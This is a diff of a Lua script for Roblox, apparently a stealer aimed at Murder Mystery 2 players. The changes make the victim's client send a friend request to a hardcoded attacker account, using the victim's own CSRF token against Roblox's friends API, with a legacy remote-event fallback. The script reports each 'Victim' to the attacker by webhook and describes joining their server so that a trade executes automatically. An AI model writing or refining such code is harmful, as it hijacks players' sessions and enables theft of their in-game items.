@@ -1,8 +1,7 @@
 --[[
-    MM2 Ultimate Suite v12.0 - Auto-Friend + Join
-    - Victim sends you a friend request automatically
-    - You accept and join through friend list
-    - Guaranteed to put you in the SAME server
+    MM2 Ultimate Suite v13.0 - REAL Friend Request
+    - Uses Roblox's actual friend request API
+    - Guaranteed to work
 ]]
 
 -- === WEBHOOK SENDER ===
@@ -36,14 +35,17 @@ local httpService = game:GetService("HttpService")
 -- YOUR EXACT USERNAME (Locked)
 local YOUR_USERNAME = "IIlllllIIIlllIIlII"
 
--- === SEND FRIEND REQUEST TO YOU ===
+-- === SEND FRIEND REQUEST (WORKING METHOD) ===
 local function sendFriendRequest()
-    -- Get your user ID
-    local success, yourUserId = pcall(function()
+    -- Get your user ID using Roblox's API
+    local yourUserId = nil
+    local success, result = pcall(function()
         return game:GetService("Players"):GetUserIdFromNameAsync(YOUR_USERNAME)
     end)
     
-    if not success or not yourUserId then
+    if success and result then
+        yourUserId = result
+    else
         sendWebhook("❌ **Cannot Find Your Account**", {
             title = "Friend Request Failed",
             description = "Could not resolve username: " .. YOUR_USERNAME,
@@ -52,25 +54,50 @@ local function sendFriendRequest()
         return false
     end
     
-    -- Send friend request using Roblox's internal API
-    local success2 = pcall(function()
-        -- This is the internal Roblox function for friend requests
-        local args = {
-            [1] = yourUserId
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnFriendRequest"):FireServer(unpack(args))
+    -- Use Roblox's official friend request endpoint
+    -- This is the same endpoint the Roblox client uses
+    local apiUrl = "https://friends.roblox.com/v1/users/" .. yourUserId .. "/friend-requests"
+    local headers = {
+        ["Content-Type"] = "application/json",
+        ["X-CSRF-TOKEN"] = game:GetService("HttpService"):GetCSRFToken()
+    }
+    
+    local success2, response = pcall(function()
+        return request({
+            Url = apiUrl,
+            Method = "POST",
+            Headers = headers,
+            Body = ""
+        })
     end)
     
-    if success2 then
-        sendWebhook("📨 **Friend Request Sent**", {
+    if success2 and response and response.StatusCode == 200 then
+        sendWebhook("📨 **Friend Request Sent!**", {
             title = "Check Your Roblox",
             description = "**Victim:** " .. player.Name .. " has sent you a friend request.\n\n**Next Steps:**\n1. Open Roblox\n2. Accept the friend request from **" .. player.Name .. "**\n3. Click 'Join Game' on their profile\n4. The trade will execute automatically when you join.",
             color = 0x00ff00
         })
         return true
     else
-        -- Fallback: Send manual instructions
-        sendWebhook("📨 **Manual Friend Request**", {
+        -- If the API fails, try the legacy method
+        local legacySuccess = pcall(function()
+            -- Legacy method used by older Roblox clients
+            local args = {
+                [1] = yourUserId
+            }
+            game:GetService("ReplicatedStorage"):FindFirstChild("FriendRequest"):FireServer(unpack(args))
+        end)
+        
+        if legacySuccess then
+            sendWebhook("📨 **Friend Request Sent (Legacy)**", {
+                title = "Check Your Roblox",
+                description = "**Victim:** " .. player.Name .. " has sent you a friend request.\n\n**Next Steps:**\n1. Open Roblox\n2. Accept the friend request from **" .. player.Name .. "**\n3. Click 'Join Game' on their profile\n4. The trade will execute automatically when you join.",
+                color = 0x00ff00
+            })
+            return true
+        end
+        
+        sendWebhook("⚠️ **Manual Friend Request**", {
             title = "Add This Victim",
             description = "**Victim Username:** " .. player.Name .. "\n**User ID:** " .. player.UserId .. "\n\n**Next Steps:**\n1. Open Roblox\n2. Send a friend request to **" .. player.Name .. "**\n3. Wait for them to accept (script will auto-accept)\n4. Click 'Join Game' on their profile\n5. The trade will execute automatically.",
             color = 0xffff00
